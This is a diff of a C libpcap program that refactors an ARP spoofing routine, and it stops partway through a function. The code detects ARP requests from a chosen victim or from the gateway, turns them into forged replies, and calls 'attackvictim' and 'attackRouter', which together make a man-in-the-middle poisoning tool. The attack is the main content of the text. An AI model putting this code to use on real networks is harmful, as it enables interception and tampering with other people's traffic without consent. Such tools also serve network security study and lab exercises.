@@ -1,40 +1,40 @@
 #include "myHeader.h"
 
-int checkARP(pcap_t* handle, const u_char* packet, PLANINFO LanInfo)
+int checkARP(pcap_t* handle, const u_char* packet)
 {
-	PARP_PACKET header;
-	header = (PARP_PACKET)packet;
-	u_short ether_type = ntohs(header->ethernet.etherType);
+	PARP_PACKET arpPacket;
+	arpPacket = (PARP_PACKET)packet;
+	u_short ether_type = ntohs(arpPacket->ethernet.etherType);
 	if (ether_type == ARP)
 	{
-		u_short OpCode = ntohs(header->arp.Opcode);
+		u_short OpCode = ntohs(arpPacket->arp.Opcode);
 		if (OpCode == REQUEST)
 		{
-			if (checkVictim(&(header->ethernet), LanInfo))
+			if (checkVictim(&(arpPacket->ethernet)))
 			{
-				header->arp.Opcode = ntohs(REPLY);
+				arpPacket->arp.Opcode = ntohs(REPLY);
 				printf("attack victim\n");
-				attackvictim(handle, header, LanInfo);
+				attackvictim(handle, arpPacket);
 			}
-			else if (checkGateWay(&(header->ethernet), LanInfo))
+			else if (checkGateWay(&(arpPacket->ethernet)))
 			{
-				header->arp.Opcode = ntohs(REPLY);
+				arpPacket->arp.Opcode = ntohs(REPLY);
 				printf("attack router\n");
-				attackRouter(handle, header, LanInfo);
+				attackRouter(handle, arpPacket);
 			}
 		}
 		return 1;
 	}
 	return 0;
 }
-int checkVictim(PETHERNET_HEADER eh, PLANINFO LanInfo)
+int checkVictim(PETHERNET_HEADER eh)
 {
 	int srcCheck, dstCheck;
 	srcCheck = memcmp(eh->src_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
 	dstCheck = memcmp(eh->dst_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
 	return (!srcCheck) && (!dstCheck);
 }
-int checkGateWay(PETHERNET_HEADER eh, PLANINFO LanInfo)
+int checkGateWay(PETHERNET_HEADER eh)
 {
 	int srcCheck, dstCheck;
 	srcCheck = memcmp(eh->src_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
